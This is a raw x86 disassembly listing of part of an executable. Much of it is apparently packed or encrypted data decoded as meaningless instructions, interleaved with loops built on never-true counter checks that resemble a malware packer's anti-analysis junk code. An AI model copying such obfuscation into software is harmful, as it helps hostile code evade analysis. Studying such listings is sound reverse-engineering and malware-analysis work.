  40598d:	sbb    DWORD PTR [ebp+eax*2-0x39],edx
  405991:	inc    esp
  405992:	or     al,0x88
  405994:	push   esi
  405995:	sbb    eax,0x8190f5ff
  40599a:	inc    esp
  40599b:	shr    DWORD PTR [ecx-0x6c],cl
  40599e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40599f:	xor    DWORD PTR [ecx-0x6b],esp
  4059a2:	mov    dl,0x5d
  4059a4:	(bad)  
  4059a5:	in     al,dx
  4059a6:	fisttp QWORD PTR [ecx-0x48]
  4059a9:	ins    BYTE PTR es:[edi],dx
  4059aa:	shl    DWORD PTR [ebp+esi*1-0x3f],0xdf
  4059af:	mov    edi,0xb8608d36
  4059b4:	sbb    BYTE PTR [ecx+eiz*8-0x4cafd8ae],ch
  4059bb:	jbe    0x405a36
  4059bd:	cmp    dl,BYTE PTR [edi]
  4059bf:	fld    TBYTE PTR [esp+edi*2+0x3cfc50cd]
  4059c6:	add    al,0x90
  4059c8:	mov    esp,0x916636a5
  4059cd:	add    esp,edx
  4059cf:	fdivr  DWORD PTR [ecx]
  4059d1:	dec    BYTE PTR [ecx-0x4d8aef85]
  4059d7:	(bad)  
  4059d8:	sub    eax,0x7cef525b
  4059dd:	jge    0x405a3b
  4059df:	adc    DWORD PTR [esi-0x39494e6],edi
  4059e5:	push   esi
  4059e6:	inc    ebp
  4059e7:	mov    ?,WORD PTR [ebx+0x6e87b63a]
  4059ed:	cmp    ebp,DWORD PTR [ecx+0x462b21bf]
  4059f3:	and    eax,0xd255bec5
  4059f8:	call   0xbc700e7b
  4059fd:	xchg   esp,eax
  4059fe:	iret   
  4059ff:	outs   dx,DWORD PTR ds:[esi]
  405a00:	nop
  405a01:	sti    
  405a02:	push   ecx
  405a03:	cwde   
  405a04:	std    
  405a05:	mov    al,0xd8
  405a07:	or     BYTE PTR [ecx],ch
  405a09:	xchg   ebx,eax
  405a0a:	inc    edx
  405a0b:	(bad)  
  405a0c:	mov    ebp,0x8aa34d07
  405a11:	add    eax,0xcbaef679
  405a16:	xor    al,0x1b
  405a18:	in     al,dx
  405a19:	push   edx
  405a1a:	jb     0x405a29
  405a1c:	fisubr WORD PTR [esi]
  405a1e:	imul   esi,DWORD PTR [eax],0xffffffeb
  405a21:	or     eax,0xe678ed87
  405a26:	inc    ebp
  405a27:	jg     0x405a91
  405a29:	repz leave 
  405a2b:	push   ss
  405a2c:	jnp    0x405a46
  405a2e:	mov    bl,0xf1
  405a30:	inc    edx
  405a31:	lods   eax,DWORD PTR ds:[esi]
  405a32:	loopne 0x405a69
  405a34:	test   eax,0x538123f9
  405a39:	aas    
  405a3a:	test   BYTE PTR [eax],ah
  405a3c:	mov    bh,0x1c
  405a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a3f:	out    dx,al
  405a40:	data16 js 0x405aba
  405a43:	xor    dl,BYTE PTR [ebp+0x31]
  405a46:	retf   0x165a
  405a49:	sbb    BYTE PTR [edx-0xcd577d1],bl
  405a4f:	jno    0x405a1c
  405a51:	cmp    esp,DWORD PTR [edx+0x3b]
  405a54:	pop    eax
  405a55:	mov    eax,ds:0x9a36ebb4
  405a5a:	inc    ecx
  405a5b:	adc    al,0xd1
  405a5d:	xchg   ebx,eax
  405a5e:	sbb    ah,BYTE PTR [ebx+0x4d]
  405a61:	imul   edx,DWORD PTR [ecx-0xed2be6a],0x1b
  405a68:	aam    0x16
  405a6a:	data16 cmp BYTE PTR [ecx+0x34],bl
  405a6e:	mov    ch,0x1a
  405a70:	pop    edx
  405a71:	add    al,BYTE PTR [edi-0x642bade1]
  405a77:	shr    BYTE PTR [edx-0x4b],1
  405a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a7b:	ja     0x405a69
  405a7d:	fisubr DWORD PTR [ebp+0x6f1f4511]
  405a83:	pop    ss
  405a84:	(bad)  
  405a85:	jb     0x405a4a
  405a87:	mov    ds:0xc2ab04b4,eax
  405a8c:	pop    edi
  405a8d:	enter  0x47ba,0xa3
  405a91:	je     0x405b0a
  405a93:	lods   eax,DWORD PTR ds:[esi]
  405a94:	stos   DWORD PTR es:[edi],eax
  405a95:	mov    bh,0x1e
  405a97:	outs   dx,BYTE PTR ds:[esi]
  405a98:	dec    ebx
  405a99:	jl     0x405ac4
  405a9b:	les    edx,FWORD PTR [edi+0x17]
  405a9e:	xor    esp,DWORD PTR ds:0xe97402df
  405aa4:	and    al,0xc
  405aa6:	mov    dh,0xbe
  405aa8:	xor    al,0x73
  405aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aab:	add    BYTE PTR [esi+0x28],bh
  405aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aaf:	cmp    al,0xf9
  405ab1:	arpl   ax,cx
  405ab3:	xchg   ecx,eax
  405ab4:	push   ds
  405ab5:	fdiv   DWORD PTR [esi+edi*2]
  405ab8:	xchg   ebp,eax
  405ab9:	ret    0xc727
  405abc:	sysret 
  405abe:	or     eax,0x7d0d29b9
  405ac3:	adc    ah,BYTE PTR [esi]
  405ac5:	sub    BYTE PTR ds:0x5e9dc4f1,0x8f
  405acc:	lea    ebx,[edi-0x32]
  405acf:	sbb    DWORD PTR [edi-0x6b],0xffffff9d
  405ad3:	arpl   WORD PTR [ecx+esi*8+0x76],bp
  405ad7:	rol    BYTE PTR [eax],cl
  405ad9:	fsub   DWORD PTR [eax]
  405adb:	add    BYTE PTR [ebx],0xdb
  405ade:	repz aaa 
  405ae0:	mov    cl,0x58
  405ae2:	(bad)  
  405ae3:	jge    0x405adb
  405ae5:	das    
  405ae6:	es cmc 
  405ae8:	push   0xffffffe2
  405aea:	lds    edx,FWORD PTR [edi]
  405aec:	sbb    BYTE PTR [edi+esi*8],bl
  405aef:	adc    DWORD PTR [eax+0x15],ebp
  405af2:	pop    edi
  405af3:	or     BYTE PTR [eax-0x36],cl
  405af6:	nop
  405af7:	and    edx,esi
  405af9:	dec    esp
  405afa:	push   0x7af81a23
  405aff:	outs   dx,DWORD PTR ds:[esi]
  405b00:	bound  ebp,QWORD PTR [edx]
  405b02:	int    0xac
  405b04:	les    ecx,FWORD PTR [ebx+0x5ba4c311]
  405b0a:	(bad)  
  405b0b:	and    esp,esi
  405b0d:	into   
  405b0e:	or     DWORD PTR [ecx],0xffffffed
  405b11:	or     DWORD PTR [ecx+0x74690313],esp
  405b17:	cmp    eax,0xea55687b
  405b1c:	jnp    0x405ae7
  405b1e:	(bad)  
  405b1f:	sbb    eax,0x38052c80
  405b24:	add    eax,0xd95a6e9c
  405b29:	jnp    0x405b4f
  405b2b:	sub    BYTE PTR [ebx+0x57aaa675],ah
  405b31:	aaa    
  405b32:	sub    bh,ah
  405b34:	inc    ebx
  405b35:	outs   dx,DWORD PTR ds:[esi]
  405b36:	(bad)
  405b39:	xchg   DWORD PTR [ebx],ecx
  405b3b:	pop    ss
  405b3c:	push   ebp
  405b3d:	mov    ds:0xd8177d8f,eax
  405b42:	sub    al,0xc2
  405b44:	bound  ebx,QWORD PTR [esi-0x4a96e3]
  405b4a:	imul   esp,DWORD PTR [edx],0xa471404f
  405b50:	inc    esp
  405b51:	mov    al,0x69
  405b53:	or     eax,0xa3455a32
  405b58:	mov    cl,0x43
  405b5a:	(bad)  [edx]
  405b5c:	dec    ebx
  405b5d:	mov    DWORD PTR [ebp+0x5f],esi
  405b60:	and    ch,BYTE PTR [edi+0x6ad87562]
  405b66:	mov    al,0x9e
  405b68:	or     ebp,eax
  405b6a:	repnz imul edx,DWORD PTR [edx],0x177ab3b8
  405b71:	add    al,0xe4
  405b73:	pusha  
  405b74:	jle    0x405ba2
  405b76:	xlat   BYTE PTR ds:[ebx]
  405b77:	(bad)  
  405b78:	push   esi
  405b79:	xchg   ecx,eax
  405b7a:	xor    dl,BYTE PTR [edi]
  405b7c:	repz test al,0xcb
  405b7f:	cmp    ebp,esp
  405b81:	pop    edi
  405b82:	sahf   
  405b83:	aaa    
  405b84:	lock push eax
  405b86:	inc    eax
  405b87:	(bad)  
  405b89:	ja     0x405b38
  405b8b:	push   es
  405b8c:	loope  0x405b6b
  405b8e:	lods   eax,DWORD PTR ds:[esi]
  405b8f:	fstp   DWORD PTR [esi-0x72]
  405b92:	int    0xe9
  405b94:	cmc    
  405b95:	loope  0x405b41
  405b97:	mov    ch,0xb0
  405b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b9a:	mov    edx,0x50f03611
  405b9f:	mov    cl,0x74
  405ba1:	imul   esp,DWORD PTR [edx+0xe],0xffffffb0
  405ba5:	stc    
  405ba6:	mov    edi,0xf7006851
  405bab:	fs inc ecx
  405bad:	cld    
  405bae:	mov    eax,ds:0x1d218c17
  405bb3:	ficom  WORD PTR [ecx-0x7491da19]
  405bb9:	dec    eax
  405bba:	fsub   QWORD PTR [edi]
  405bbc:	xchg   esp,eax
  405bbd:	stos   DWORD PTR es:[edi],eax
  405bbe:	jmp    0x4b0b1c67
  405bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc4:	ror    BYTE PTR [eax],cl
  405bc6:	leave  
  405bc7:	pushf  
  405bc8:	(bad)  
  405bc9:	pop    esp
  405bca:	jne    0x405ba2
  405bcc:	shr    DWORD PTR [ecx],cl
  405bce:	xchg   dh,dh
  405bd0:	aaa    
  405bd1:	or     ebp,esp
  405bd3:	jge    0x405c4c
  405bd5:	adc    eax,0x3204decb
  405bda:	in     al,dx
  405bdb:	fnsave [ecx]
  405bdd:	pop    ebx
  405bde:	inc    ebx
  405bdf:	jb     0x405b6a
  405be1:	mov    esi,0x9cb02f6f
  405be6:	scas   eax,DWORD PTR es:[edi]
  405be7:	add    edx,esp
  405be9:	inc    edx
  405bea:	in     al,dx
  405beb:	jmp    0x22a51ebe
  405bf0:	nop
  405bf1:	out    dx,al
  405bf2:	sub    bh,0xf6
  405bf5:	pop    es
  405bf6:	es call 0x4329:0xcd311e1c
  405bfe:	inc    ebx
  405bff:	popa   
  405c00:	mov    ebp,edi
  405c02:	lods   eax,DWORD PTR ds:[esi]
  405c03:	sub    DWORD PTR [edi],0xffffff9f
  405c06:	(bad)  
  405c07:	sbb    DWORD PTR [ecx+edi*2-0x39],eax
  405c0b:	je     0x405bb9
  405c0d:	cli    
  405c0e:	aaa    
  405c0f:	int3   
  405c10:	xchg   ebx,eax
  405c11:	adc    dh,BYTE PTR ds:0xab9b27b7
  405c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c18:	arpl   si,dx
  405c1a:	mov    ch,0xe9
  405c1c:	ins    DWORD PTR es:[edi],dx
  405c1d:	pop    ecx
  405c1e:	ret    
  405c1f:	sub    al,0x76
  405c21:	sub    al,0xb1
  405c23:	sar    bl,0x32
  405c26:	mov    edx,0x738a8be0
  405c2b:	mov    ah,BYTE PTR [eax-0x4a]
  405c2e:	lods   eax,DWORD PTR ds:[esi]
  405c2f:	pop    edx
  405c30:	ins    DWORD PTR es:[edi],dx
  405c31:	mov    ecx,0x3951956a
  405c36:	and    ebp,ebp
  405c38:	push   ebp
  405c39:	xchg   edx,eax
  405c3a:	pop    ds
  405c3b:	inc    ecx
  405c3c:	xchg   edi,eax
  405c3d:	adc    ecx,DWORD PTR [eax]
  405c3f:	xchg   edi,eax
  405c40:	imul   esi,DWORD PTR [eax+0x710c2b16],0xc8fc51e3
  405c4a:	test   al,0x43
  405c4c:	and    dh,BYTE PTR [eax+esi*1-0x10]
  405c50:	pop    esi
  405c51:	mov    al,ds:0x44281ca0
  405c56:	loopne 0x405c50
  405c58:	scas   al,BYTE PTR es:[edi]
  405c59:	int    0x1a
  405c5b:	shr    BYTE PTR [ecx+0x30c2213e],1
  405c61:	fcomp  DWORD PTR [edx+0x15]
  405c64:	out    dx,eax
  405c65:	pop    esp
  405c66:	lahf   
  405c67:	loope  0x405c21
  405c69:	jae    0x405c45
  405c6b:	cwde   
  405c6c:	xchg   DWORD PTR [eax],ebp
  405c6e:	outs   dx,BYTE PTR ds:[esi]
  405c6f:	xchg   esp,eax
  405c70:	jmp    0xa0f606bd
  405c75:	mov    WORD PTR [esi],es
  405c77:	adc    BYTE PTR ds:[si],al
  405c7b:	ins    BYTE PTR es:[edi],dx
  405c7c:	pop    es
  405c7d:	rcl    DWORD PTR [ebp*2-0x47341347],1
  405c84:	mov    bl,0xfb
  405c86:	or     bh,ch
  405c88:	sbb    edx,DWORD PTR [ecx*1+0x6409fa58]
  405c8f:	sub    eax,0x38fd3fc0
  405c94:	add    eax,0x616c6b15
  405c99:	xlat   BYTE PTR ds:[ebx]
  405c9a:	push   0xffffffda
  405c9c:	xor    al,0xfb
  405c9e:	sahf   
  405c9f:	nop
  405ca0:	adc    eax,0x6cd15dc6
  405ca5:	mov    edi,0x12c7105c
  405caa:	dec    esp
  405cab:	push   esi
  405cac:	out    dx,al
  405cad:	pop    ss
  405cae:	dec    edx
  405caf:	fild   WORD PTR [esi]
  405cb1:	fistp  QWORD PTR [edx-0x1a5a661c]
  405cb7:	sub    al,al
  405cb9:	lock adc dl,ah
  405cbc:	mov    al,ds:0xadf49d50
  405cc1:	pop    ds
  405cc2:	mov    bl,0x6d
  405cc4:	cmp    BYTE PTR [eax+0x5f],cl
  405cc7:	mov    ecx,0xfc83bb8
  405ccc:	test   DWORD PTR [edx],edx
  405cce:	add    al,0x0
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x43453f
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434553,0x43457b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43460f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4345c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434547,0x12
  405d19:	cmp    DWORD PTR ds:0x434547,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434547,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434547
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434547,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x8bca1bd6
  405d8d:	scas   al,BYTE PTR es:[edi]
  405d8e:	xor    esi,DWORD PTR [ebp-0x3b8181c4]
  405d94:	jns    0x405e14
  405d96:	jle    0x405db9
  405d98:	or     bh,cl
  405d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d9b:	repnz lds ebx,FWORD PTR [ebp-0xd]
  405d9f:	mov    edi,DWORD PTR [ebx]
  405da1:	clc    
  405da2:	cmc    
  405da3:	dec    ebp
  405da4:	enter  0x755f,0x66
  405da8:	jo     0x405d46
  405daa:	sbb    esp,DWORD PTR [esi-0x313390b1]
  405db0:	or     ecx,DWORD PTR [ebp+0x1]
  405db3:	sbb    cl,dl
  405db5:	adc    DWORD PTR [edi+0x41a58d85],ecx
  405dbb:	jbe    0x405de6
  405dbd:	jne    0x405e0d
  405dbf:	rcl    DWORD PTR [ecx-0x5f265291],0x9
  405dc6:	test   BYTE PTR [eax+0x4144c47b],dl
  405dcc:	and    cl,ch
  405dce:	scas   al,BYTE PTR es:[edi]
  405dcf:	cmc    
  405dd0:	push   ebx
  405dd1:	jp     0x405e10
  405dd3:	pop    ecx
  405dd4:	xor    BYTE PTR [edi],dh
  405dd6:	mov    ah,0xd8
  405dd8:	adc    eax,0xe48d984
  405ddd:	out    0x3f,al
  405ddf:	enter  0xc929,0x56
  405de3:	add    eax,0xcf12733d
  405de8:	inc    esi
  405de9:	jbe    0x405d8a
  405deb:	or     eax,0xf01e0c90
  405df0:	jbe    0x405dbb
  405df2:	mov    eax,0x49dcb63d
  405df7:	iret   
  405df8:	(bad)  
  405df9:	dec    ebx
  405dfa:	popa   
  405dfb:	xchg   esi,eax
  405dfc:	xchg   edi,eax
  405dfd:	aas    
  405dfe:	xchg   esp,eax
  405dff:	and    ebx,DWORD PTR ds:0x45912f0b
  405e05:	repnz mov ds,WORD PTR [edx-0x9d464f5]
  405e0c:	not    DWORD PTR [esi]
  405e0e:	push   edx
  405e0f:	mov    bh,0xdf
  405e11:	dec    esp
  405e12:	addr16 xor eax,0x3a5fc468
  405e18:	mov    ebx,0xa8834b6b
  405e1d:	adc    edx,DWORD PTR [edi]
  405e1f:	out    dx,al
  405e20:	add    BYTE PTR ds:0x763f4a6e,bh
  405e26:	ins    DWORD PTR es:[edi],dx
  405e27:	jb     0x405e97
  405e29:	adc    esp,ebp
  405e2b:	scas   eax,DWORD PTR es:[edi]
  405e2c:	dec    ebp
  405e2d:	imul   BYTE PTR [esi+0x2]
  405e30:	ja     0x405df7
  405e32:	add    eax,0x39359ed0
  405e37:	lahf   
  405e38:	mov    eax,0xac6eb85d
  405e3d:	inc    edi
  405e3e:	mov    ds:0x7197583d,al
  405e43:	in     al,0x13
  405e45:	inc    edi
  405e46:	jno    0x405e8f
  405e48:	stc    
  405e49:	data16 mov ds:0xed9a5458,al
  405e4f:	mov    dl,0xe9
  405e51:	pop    edi
  405e52:	adc    BYTE PTR [ebp-0x1f],bh
  405e55:	jns    0x405e81
  405e57:	mov    fs,WORD PTR [edx]
  405e59:	xchg   DWORD PTR [ebp+0x86f844c],esp
  405e5f:	xor    dh,BYTE PTR [eax-0xa]
  405e62:	cwde   
  405e63:	cli    
  405e64:	cs daa 
  405e66:	jmp    0x8f44f643
  405e6b:	add    ebx,DWORD PTR es:[esp+edx*4-0x3a]
  405e70:	je     0x405e69
  405e72:	push   esi
  405e73:	into   
  405e74:	stos   DWORD PTR es:[edi],eax
  405e75:	test   DWORD PTR [eax-0x2ce7c0dc],ecx
  405e7b:	and    eax,0x5a2bc576
  405e80:	xor    al,0x94
  405e82:	out    0xd2,eax
  405e84:	(bad)  
  405e85:	jb     0x405efc
  405e87:	jns    0x405e68
  405e89:	bound  esi,QWORD PTR [edi-0x5e]
  405e8c:	lods   eax,DWORD PTR ds:[esi]
  405e8d:	dec    esp
  405e8e:	(bad)
  405e92:	retf   0xf10a
  405e95:	dec    esp
  405e96:	adc    eax,0xa816c823
  405e9b:	mov    eax,0x800fe517
  405ea0:	xor    BYTE PTR [ebp+0x7a],dl
  405ea3:	jge    0x405e54
  405ea5:	js     0x405ec4
  405ea7:	rcr    DWORD PTR [ebx+0x52],1
  405eaa:	pop    ebx
  405eab:	sub    eax,0x2e08d5da
  405eb0:	mov    bh,0xd9
  405eb2:	jne    0x405efc
  405eb4:	das    
  405eb5:	pop    ecx
  405eb6:	loop   0x405f10
  405eb8:	sbb    BYTE PTR [ebp+edi*1+0x4a73d123],0xdb
  405ec0:	sub    dh,BYTE PTR [esi-0x6ae29234]
  405ec6:	push   edi
  405ec7:	dec    esi
  405ec8:	loopne 0x405e4f
  405eca:	test   BYTE PTR [ecx],ah
  405ecc:	xchg   ebp,eax
  405ecd:	mul    BYTE PTR [edi-0x80]
  405ed0:	mov    dl,0x2e
  405ed2:	sbb    al,0x78
  405ed4:	push   cs
  405ed5:	pop    edi
  405ed6:	call   0x845887b6
  405edb:	or     dl,BYTE PTR [edx-0x4f]
  405ede:	(bad)  
  405edf:	out    dx,eax
  405ee0:	add    ebx,esi
  405ee2:	in     eax,0xed
  405ee4:	cli    
  405ee5:	pop    ebp
  405ee6:	enter  0x8732,0x27
  405eea:	mov    dl,al
  405eec:	inc    edi
  405eed:	or     edx,DWORD PTR [esp+edi*2+0x59]
  405ef1:	gs aad 0xfe
  405ef4:	retf   0xf21d
  405ef7:	dec    eax
  405ef8:	sti    
  405ef9:	popa   
  405efa:	or     dl,bh
  405efc:	cmp    BYTE PTR [eax-0x65],bh
  405eff:	mov    cl,0x5b
  405f01:	push   ecx
  405f02:	cs push cs
  405f04:	pop    esp
  405f05:	add    bh,ah
  405f07:	ins    DWORD PTR es:[edi],dx
  405f08:	pushf  
  405f09:	xchg   DWORD PTR [ebx],esi
  405f0b:	sub    dl,dh
  405f0d:	dec    eax
  405f0e:	and    al,0xb7
  405f10:	jmp    0x77d:0x55910e2e
  405f17:	jge    0x405ec1
  405f19:	es popw es
  405f1c:	icebp  
  405f1d:	cmp    DWORD PTR [ebp+0x73],ebx
  405f20:	inc    esp
  405f21:	jg     0x405f93
  405f23:	xor    DWORD PTR [edx-0x60],0x59adef92
  405f2a:	add    ebx,esi
  405f2c:	mov    eax,ds:0x1bb4a76e
  405f31:	(bad)  [edi-0x2e]
  405f34:	jb     0x405f59
  405f36:	bound  eax,QWORD PTR [ebp+0x6e]
  405f39:	fiadd  DWORD PTR ss:[ecx+0x32c29502]
  405f40:	test   al,0xfb
  405f42:	les    ebx,FWORD PTR [ecx-0x15]
  405f45:	psubusb mm5,mm3
  405f48:	add    BYTE PTR [ecx],ah
  405f4a:	sbb    ebp,DWORD PTR [esi-0x26]
  405f4d:	jmp    0xa524381b
  405f52:	aad    0xfa
  405f54:	sbb    BYTE PTR [ecx],al
  405f56:	push   DWORD PTR [edx-0x1b]
  405f59:	leave  
  405f5a:	sbb    DWORD PTR [ebx],0xffffffb6
  405f5d:	les    ebx,FWORD PTR [ebp-0xe4e75b6]
  405f63:	pusha  
  405f64:	mov    esi,0x1adc9f1d
  405f69:	cmovnp ebp,ecx
  405f6c:	stc    
  405f6d:	xor    BYTE PTR [edi+eax*4+0x525aedeb],0x59
  405f75:	and    edx,DWORD PTR [ecx+0x6ddee5fb]
  405f7b:	xchg   esi,eax
  405f7c:	push   ecx
  405f7d:	ins    BYTE PTR es:[edi],dx
  405f7e:	iret   
  405f7f:	push   edi
  405f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f81:	dec    esi
  405f82:	loope  0x405fb7
  405f84:	adc    DWORD PTR [eax+eiz*1-0x10123d7e],0x0
  405f8c:	pop    esi
  405f8d:	or     bl,BYTE PTR [edx-0x61]
  405f90:	loope  0x405fae
  405f92:	cmp    eax,0xe219448a
  405f97:	or     BYTE PTR [eax+0x3a],dh
  405f9a:	mov    ch,0x29
  405f9c:	xor    DWORD PTR [ebx+esi*2],esi
  405f9f:	sti    
  405fa0:	mov    cl,0x1c
  405fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa3:	mov    dl,0xb5
  405fa5:	inc    edi
  405fa6:	scas   eax,DWORD PTR es:[edi]
  405fa7:	or     eax,0xfda4b61a
  405fac:	add    ecx,DWORD PTR [ebp+0x0]
  405faf:	rol    ebx,cl
  405fb1:	shr    DWORD PTR [edi],cl
  405fb3:	rcl    dl,cl
  405fb5:	sar    DWORD PTR [edi+edi*1-0x1a],cl
  405fb9:	jge    0x40602d
  405fbb:	add    DWORD PTR [edi+0x5b],eax
  405fbe:	jg     0x406034
  405fc0:	sti    
  405fc1:	pop    ss
  405fc2:	(bad)  [edi-0x3d]
  405fc5:	je     0x405ff6
  405fc7:	nop
  405fc8:	push   eax
  405fc9:	mov    WORD PTR ds:0xc8d8f791,?
  405fcf:	fst    QWORD PTR [ecx+0x26448dfe]
  405fd5:	fstp   QWORD PTR [ecx-0x46cf9084]
  405fdb:	adc    esi,ebx
  405fdd:	int    0xc7
  405fdf:	cs jle 0x406006
  405fe2:	jae    0x405fda
  405fe4:	test   al,0xd4
  405fe6:	push   esp
  405fe7:	das    
  405fe8:	(bad)  
  405fe9:	into   
  405fea:	mov    eax,ds:0xa033c714
  405fef:	adc    edi,DWORD PTR [ebx-0x73]
  405ff2:	addr16 add al,0x90
  405ff5:	pop    ds
  405ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ff7:	sti    
  405ff8:	inc    esi
  405ff9:	xor    ah,BYTE PTR [ebp+0x31]
  405ffc:	and    eax,0xe8253e49
  406001:	dec    esp
  406002:	push   cs
  406003:	mov    dh,0xc0
  406005:	pusha  
  406006:	loopne 0x405f99
  406008:	arpl   cx,bp
  40600a:	int    0xaf
  40600c:	ins    BYTE PTR es:[edi],dx
  40600d:	or     al,0xb6
  40600f:	cmp    al,0x7c
  406011:	lods   al,BYTE PTR ds:[esi]
  406013:	loope  0x405ff6
  406015:	add    BYTE PTR [ecx+0x3611cd79],bh
  40601b:	out    0x87,al
  40601d:	pop    es
  40601e:	inc    edi
  40601f:	fmulp  st(0),st
  406021:	adc    al,BYTE PTR [edi]
  406023:	bswap  ebx
  406025:	add    DWORD PTR ds:0x927b5b81,0x10f595d8
  40602f:	retf   
  406030:	scas   eax,DWORD PTR es:[edi]
  406031:	daa    
  406032:	test   eax,0x5c743351
  406037:	adc    al,0xc0
  406039:	das    
  40603a:	jb     0x405fec
  40603c:	fmul   DWORD PTR [ebx-0x2e3634e2]
  406043:	pop    edx
  406044:	add    eax,0xfe4544f8
  406049:	mov    bh,0xa4
  40604b:	enter  0x2f5a,0x6
  40604f:	mov    bh,0x6f
  406051:	lock mov esi,0x2dd5710b
  406057:	mov    eax,ds:0xb3d225ec
  40605c:	pop    esi
  40605d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40605e:	aad    0xfd
  406060:	mov    ds:0x66068030,al
  406065:	or     eax,0x7a7f34e0
  40606a:	pop    es
  40606b:	cwde   
  40606c:	(bad)  
  40606d:	jmp    0x9a4a:0x5370ff61
  406074:	pop    ss
  406075:	mov    esi,0x62a48712
  40607a:	sar    DWORD PTR [ecx],1
  40607c:	inc    ebp
  40607d:	mov    al,0x51
  40607f:	xchg   edx,eax
  406080:	mov    ds:0x244e7156,eax
  406085:	pop    edx
  406086:	aad    0x36
  406088:	sub    al,0x8c
  40608a:	mov    ah,0x94
  40608c:	dec    ebx
  40608d:	dec    DWORD PTR [esi]
  40608f:	arpl   WORD PTR [edx-0x5b],sp
  406092:	out    0x9c,eax
  406094:	cmc    
  406095:	push   ebp
  406096:	sub    al,BYTE PTR ds:0x9a3d0131
  40609c:	and    BYTE PTR [eax+ebx*8-0x3f],dh
  4060a0:	enter  0x194a,0xc7
  4060a4:	mov    dh,0xcd
  4060a6:	mov    dl,0x4c
  4060a8:	push   edx
  4060a9:	test   DWORD PTR [ebx-0x92f3147],ebp
  4060af:	xor    edx,0x5e
  4060b2:	shl    esp,0x58
  4060b5:	adc    edi,DWORD PTR [ebx+esi*8]
  4060b8:	retf   
  4060b9:	xor    bl,BYTE PTR [eax-0x2c]
  4060bc:	dec    edi
  4060bd:	inc    edx
  4060be:	pop    edx
  4060bf:	cwde   
  4060c0:	fisubr WORD PTR [eax+0x6251d746]
  4060c6:	cs daa 
  4060c8:	fbld   TBYTE PTR [esi+0x38695828]
  4060ce:	mov    bh,0x88
  4060d0:	mov    al,ds:0xaf8d41e0
  4060d5:	and    BYTE PTR [ebx-0x516f01aa],bh
  4060db:	push   esp
  4060dc:	add    ecx,DWORD PTR [edi]
  4060de:	test   BYTE PTR [edx-0x36000004],al
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43456f
  406101:	mov    eax,ds:0x43461b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434553,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434553
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434553,ecx
  40612c:	cmp    DWORD PTR ds:0x434553,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434553,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434537,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43457b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43457b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43457b,ecx
  406175:	cmp    DWORD PTR ds:0x43457b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43457b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43457b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43457b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43457b,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
